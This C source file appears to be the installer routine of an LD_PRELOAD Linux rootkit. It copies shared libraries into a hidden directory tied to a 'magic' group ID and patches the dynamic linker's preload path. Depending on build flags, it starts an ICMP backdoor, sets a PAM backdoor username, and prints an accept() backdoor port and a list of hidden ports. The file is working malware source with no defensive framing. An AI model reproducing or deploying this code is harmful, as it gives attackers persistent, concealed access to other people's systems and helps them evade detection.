void bignope(int p){
#ifdef PATCH_DYNAMIC_LINKER
    if(p) // ...
        ldpatch(PRELOAD_FILE, OLD_PRELOAD);
#endif
    eradicatedir(INSTALL_DIR);
    exit(0);
}

void bdvinstall(char *const argv[]){
    dorolf();
    printf("Creating installation directory.\n");

    gid_t magicgid = readgid();
    if(preparedir(INSTALL_DIR, magicgid) < 0){
        printf("Something went wrong creating the install directory.\n");
        bignope(0);
    }

    char *opath, *odup, *npath;
    int cpr, i;

    for(i = 1; argv[i] != NULL; i++){
        if(strstr(argv[i], ".so.")){
            opath = argv[i];
            odup = strdup(opath);
            npath = sogetpath(odup);
            free(odup);

            if(npath == NULL){
                printf("Could not get new path for %s.\n", opath);
                bignope(0);
            }

            cpr = socopy(opath, npath, magicgid);
            free(npath);

            if(cpr) printf("Copied: \e[1;31m%s\e[0m\n", basename(opath));
            else{
                printf("Something went wrong copying \e[1;31m%s\e[0m...\n", opath);
                bignope(0);
            }
        }else{
            printf("NO\n");
            bignope(0);
        }
    }

    if(rknomore()){
        printf("It seems something may have went wrong installing...\n");
        bignope(0);
    }

    char *preloadpath = OLD_PRELOAD;
#ifdef PATCH_DYNAMIC_LINKER
    printf("Patching dynamic linker.\n");
    preloadpath = PRELOAD_FILE;
    int p=ldpatch(OLD_PRELOAD, preloadpath);
    if(p < 0){
        printf("Something has went horribly wrong...\n");
        // ...
        bignope(0);
    }else if(p > 0) printf("Patched ld.so: \e[1;31m%d\e[0m\n", p);
    else{
        printf("Nothing to patch...?\n");
        bignope(0);
    }
#endif

    reinstall(preloadpath);
    if(!preloadok()){
        printf("Something went wrong writing to %s\n", preloadpath);
        bignope(1);
    }else printf("Installed.\n\n");

#ifdef USE_ICMP_BD
    spawnpdoor();
    sleep(1);
    if(pdoorup()) printf("ICMP backdoor up.\n");
    else printf("Failed spawning ICMP backdoor...\n");
#endif
#ifdef USE_PAM_BD
    printf("PAM username: \e[1;31m%s\e[0m\n", PAM_UNAME);
#endif
#ifdef HIDE_PORTS
    char portsbuf[512], tmp[8];
    size_t tmplen, buflen;
    memset(portsbuf, 0, sizeof(portsbuf));
    for(int i=0; i != BDVLPORTS_SIZE; i++){
#ifdef USE_ACCEPT_BD
        if(i == 0){
            printf("Accept backdoor port:\n  \e[1;31m%d\e[0m\n", bdvlports[i]);
            continue;
        }
#endif
        memset(tmp, 0, sizeof(tmp));
        snprintf(tmp, sizeof(tmp), "%d, ", bdvlports[i]);

        tmplen = strlen(tmp);
        buflen = strlen(portsbuf);

        if(buflen+tmplen >= sizeof(portsbuf)-1)
            break;

        strncat(portsbuf, tmp, tmplen);
    }
    portsbuf[strlen(portsbuf)-2]='\0';
    printf("Hidden port(s):\n  \e[1;31m%s\e[0m\n", portsbuf);
#endif
#ifdef BACKDOOR_UTIL
    printf("\nUnhappy with something?:\n  %s=1 sh -c './bdv uninstall'\n\n", BD_VAR);
#endif
    exit(0);
}